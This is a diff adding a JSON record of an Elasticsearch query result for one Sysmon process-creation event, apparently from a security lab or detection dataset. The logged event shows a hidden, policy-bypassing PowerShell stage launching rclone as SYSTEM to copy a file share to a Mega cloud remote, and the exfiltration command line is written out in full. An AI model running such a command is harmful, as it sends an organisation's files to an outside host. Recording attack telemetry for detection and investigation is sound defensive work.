@@ -1,0 +1,238 @@
+{
+  "behaviour": "process_creation",
+  "index": "logs-windows.sysmon_operational-*",
+  "identifier": {
+    "field": "process.entity_id",
+    "value": "{88E52A21-98AA-6AE0-D504-000000002600}",
+    "host": "ws01"
+  },
+  "alerts": [
+    "3d55443559f106a9d61eb3fe83cb556e2b3d9525d751cb4306e634d6644541ac"
+  ],
+  "queries": [
+    {
+      "query": {
+        "bool": {
+          "filter": [
+            {
+              "range": {
+                "@timestamp": {
+                  "gte": "2026-10-27T12:24:22.000Z",
+                  "lte": "2026-10-27T12:30:22.000Z"
+                }
+              }
+            },
+            {
+              "term": {
+                "host.name": "ws01"
+              }
+            },
+            {
+              "term": {
+                "event.code": "1"
+              }
+            },
+            {
+              "term": {
+                "process.entity_id": "{88E52A21-98AA-6AE0-D504-000000002600}"
+              }
+            }
+          ]
+        }
+      },
+      "window": {
+        "start": "2026-10-27T12:24:22.000Z",
+        "end": "2026-10-27T12:30:22.000Z"
+      },
+      "returned": 1,
+      "total": 1,
+      "relation": "eq"
+    }
+  ],
+  "returned": 1,
+  "truncated": false,
+  "sample": false,
+  "hits": [
+    {
+      "_index": ".ds-logs-windows.sysmon_operational-c0015-2026.10.24-000002",
+      "_id": "AaF9VI505TXapMFyrsIg",
+      "_source": {
+        "agent": {
+          "name": "WS01",
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "type": "filebeat",
+          "ephemeral_id": "ae039b37-ba6f-464f-8073-73b0d9659b1a",
+          "version": "9.5.3"
+        },
+        "process": {
+          "args": [
+            "C:\\ProgramData\\C0015\\rclone.exe",
+            "--config",
+            "C:\\ProgramData\\C0015\\rclone.conf",
+            "copy",
+            "--max-age",
+            "2y",
+            "\\\\FS01\\Shares",
+            "Mega:DATA",
+            "-q",
+            "--ignore-existing",
+            "--auto-confirm",
+            "--multi-thread-streams",
+            "7",
+            "--transfers",
+            "7",
+            "--bwlimit",
+            "10M"
+          ],
+          "parent": {
+            "args": [
+              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "-NoProfile",
+              "-ExecutionPolicy",
+              "Bypass",
+              "-WindowStyle",
+              "Hidden",
+              "-File",
+              "C:\\Windows\\Temp\\c0015_stage2.ps1"
+            ],
+            "name": "powershell.exe",
+            "pid": 5912,
+            "args_count": 8,
+            "entity_id": "{88E52A21-9771-6AE0-9F04-000000002600}",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1"
+          },
+          "pe": {
+            "file_version": "1.75.1",
+            "product": "Rclone",
+            "imphash": "70df50797f7a85a271c38135c5679c40",
+            "description": "Rclone",
+            "original_file_name": "rclone.exe",
+            "company": "https://rclone.org"
+          },
+          "name": "rclone.exe",
+          "pid": 7800,
+          "working_directory": "C:\\Windows\\system32\\",
+          "args_count": 17,
+          "entity_id": "{88E52A21-98AA-6AE0-D504-000000002600}",
+          "hash": {
+            "sha256": "033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c"
+          },
+          "executable": "C:\\ProgramData\\C0015\\rclone.exe",
+          "command_line": "\"C:\\ProgramData\\C0015\\rclone.exe\" --config C:\\ProgramData\\C0015\\rclone.conf copy --max-age 2y \\\\FS01\\Shares Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M"
+        },
+        "winlog": {
+          "computer_name": "WS01.c0015.lab",
+          "record_id": "1228905",
+          "process": {
+            "pid": 2616,
+            "thread": {
+              "id": 3880
+            }
+          },
+          "task": "Process Create (rule: ProcessCreate)",
+          "event_id": "1",
+          "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_data": {
+            "Company": "https://rclone.org",
+            "Description": "Rclone",
+            "LogonGuid": "{88E52A21-7C25-6AE0-E703-000000000000}",
+            "TerminalSessionId": "0",
+            "IntegrityLevel": "System",
+            "Product": "Rclone",
+            "ParentUser": "NT AUTHORITY\\SYSTEM",
+            "FileVersion": "1.75.1",
+            "LogonId": "0x3e7"
+          },
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "opcode": "Info",
+          "version": 5,
+          "user": {
+            "identifier": "S-1-5-18",
+            "domain": "NT AUTHORITY",
+            "name": "SYSTEM",
+            "type": "User"
+          }
+        },
+        "log": {
+          "level": "information"
+        },
+        "elastic_agent": {
+          "id": "a6d6f3d2-78d0-4e95-a44c-0e5fc12b1a88",
+          "version": "9.5.3",
+          "snapshot": false
+        },
+        "message": "Process Create:\nRuleName: -\nUtcTime: 2026-10-27 12:27:22.139\nProcessGuid: {88E52A21-98AA-6AE0-D504-000000002600}\nProcessId: 7800\nImage: C:\\ProgramData\\C0015\\rclone.exe\nFileVersion: 1.75.1\nDescription: Rclone\nProduct: Rclone\nCompany: https://rclone.org\nOriginalFileName: rclone.exe\nCommandLine: \"C:\\ProgramData\\C0015\\rclone.exe\" --config C:\\ProgramData\\C0015\\rclone.conf copy --max-age 2y \\\\FS01\\Shares Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {88E52A21-7C25-6AE0-E703-000000000000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA256=033EEE51C9AD47C2DE2624B6674D355274BCD6CF0027A5F85DB4437BA24AE81C,IMPHASH=70DF50797F7A85A271C38135C5679C40\nParentProcessGuid: {88E52A21-9771-6AE0-9F04-000000002600}\nParentProcessId: 5912\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\Temp\\c0015_stage2.ps1\nParentUser: NT AUTHORITY\\SYSTEM",
+        "input": {
+          "type": "winlog"
+        },
+        "@timestamp": "2026-10-27T12:27:22.139Z",
+        "ecs": {
+          "version": "8.17.0"
+        },
+        "related": {
+          "user": [
+            "SYSTEM"
+          ],
+          "hash": [
+            "033eee51c9ad47c2de2624b6674d355274bcd6cf0027a5f85db4437ba24ae81c",
+            "70df50797f7a85a271c38135c5679c40"
+          ]
+        },
+        "data_stream": {
+          "namespace": "c0015",
+          "type": "logs",
+          "dataset": "windows.sysmon_operational"
+        },
+        "host": {
+          "hostname": "WS01",
+          "os": {
+            "build": "19045.3803",
+            "kernel": "10.0.19041.3803 (WinBuild.160101.0800)",
+            "name": "Windows 10 Pro",
+            "type": "windows",
+            "family": "windows",
+            "version": "10.0",
+            "platform": "windows"
+          },
+          "ip": [
+            "fe80::a7db:e701:40fd:fff7",
+            "192.168.50.20",
+            "fe80::1ec6:790e:c5d8:664f",
+            "192.168.106.136"
+          ],
+          "name": "ws01",
+          "id": "88e52a21-1605-4868-9e88-53ea14415caa",
+          "mac": [
+            "00-0C-29-BF-09-D2",
+            "00-0C-29-BF-09-DC"
+          ],
+          "architecture": "x86_64"
+        },
+        "event": {
+          "agent_id_status": "verified",
+          "ingested": "2026-10-27T12:27:28Z",
+          "code": "1",
+          "provider": "Microsoft-Windows-Sysmon",
+          "created": "2026-10-27T12:27:23.702Z",
+          "kind": "event",
+          "action": "Process creation",
+          "category": [
+            "process"
+          ],
+          "type": [
+            "start"
+          ],
+          "dataset": "windows.sysmon_operational"
+        },
+        "user": {
+          "domain": "NT AUTHORITY",
+          "name": "SYSTEM",
+          "id": "S-1-5-18"
+        }
+      },
+      "query_index": 0
+    }
+  ]
+}
